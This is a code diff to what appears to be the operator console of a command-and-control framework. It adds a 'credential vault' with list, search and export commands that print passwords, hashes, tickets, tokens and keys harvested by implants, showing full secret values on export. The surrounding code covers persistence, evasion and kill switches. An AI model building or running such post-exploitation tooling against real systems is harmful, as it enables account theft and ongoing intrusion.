@@ -149,6 +149,45 @@ def print_postures(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
     print(f"{len(rows)} hosts, {sandboxes} in a sandbox, {silent} silent, {armed} with a kill switch")
 
 
+def print_credentials(rows: List[Dict[str, Any]], as_json: bool = False,
+                      with_secrets: bool = False) -> None:
+    """The vault of the engagement.
+
+    The table is what an operator reads before they ask for the values:
+    the kind of the material, the account it belongs to, the host it came
+    from and how sure the implant was.  The value itself only appears when
+    the operator asked for it.
+    """
+    if as_json:
+        emit(rows)
+        return
+    if not rows:
+        print("the vault is empty")
+        return
+    print(f"{'AGENT':<20} {'KIND':<10} {'ACCOUNT':<26} {'TARGET':<24} "
+          f"{'CONF':>5}  {'SOURCE':<10} {'VALUE':<12}")
+    for row in rows:
+        if with_secrets:
+            # The export is the one place where the value is shown, and it
+            # is shown whole: a value an operator cannot copy is not a
+            # value they asked for.
+            value = str(row.get("secret", "") or "")
+        else:
+            value = "(redacted)"
+        print(f"{str(row.get('agent_id', ''))[:20]:<20} "
+              f"{str(row.get('kind', ''))[:10]:<10} "
+              f"{str(row.get('account', ''))[:26]:<26} "
+              f"{str(row.get('target', ''))[:24]:<24} "
+              f"{int(row.get('confidence', 0) or 0):>5}  "
+              f"{str(row.get('source', ''))[:10]:<10} {value:<12}")
+    kinds: Dict[str, int] = {}
+    for row in rows:
+        kind = str(row.get("kind", "?"))
+        kinds[kind] = kinds.get(kind, 0) + 1
+    summary = ", ".join(f"{count} {kind}" for kind, count in sorted(kinds.items()))
+    print(f"{len(rows)} records: {summary}")
+
+
 def print_persistence(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
     """The persistence of the fleet.
 
@@ -1690,6 +1729,24 @@ def build_parser() -> argparse.ArgumentParser:
     unpersist.add_argument("--wait", action="store_true")
     unpersist.add_argument("--timeout", type=float, default=120.0)
 
+    creds_list = sub.add_parser("creds-list",
+                                help="the credential vault of the engagement")
+    creds_list.add_argument("--agent", default="", help="only this host")
+    creds_list.add_argument("--kind", default="", help="password, hash, ticket, token, key")
+    creds_list.add_argument("--query", default="", help="search the account, the target and the note")
+
+    creds_search = sub.add_parser("creds-search",
+                                  help="search the credential vault")
+    creds_search.add_argument("query")
+    creds_search.add_argument("--kind", default="")
+    creds_search.add_argument("--agent", default="")
+
+    creds_export = sub.add_parser("creds-export",
+                                  help="the material with its value (operator role)")
+    creds_export.add_argument("--agent", default="")
+    creds_export.add_argument("--kind", default="")
+    creds_export.add_argument("--query", default="")
+
     persist_list = sub.add_parser("persist-list",
                                   help="what is installed on an agent")
     persist_list.add_argument("agent")
@@ -2590,6 +2647,18 @@ def main(argv: Optional[List[str]] = None) -> int:
                               args.wait, args.timeout, args.json)
         elif args.cmd == "persist-report":
             print_persistence(client.persistence_report(args.agent), args.json)
+        elif args.cmd == "creds-list":
+            print_credentials(
+                client.creds_list(args.agent, args.kind, args.query),
+                args.json)
+        elif args.cmd == "creds-search":
+            print_credentials(
+                client.creds_search(args.query, args.kind, args.agent),
+                args.json)
+        elif args.cmd == "creds-export":
+            print_credentials(
+                client.creds_export(args.agent, args.kind, args.query),
+                args.json, with_secrets=True)
         elif args.cmd == "evade-report":
             if args.agent:
                 run_task_and_wait(client, console, args.agent, "evade.report", {},
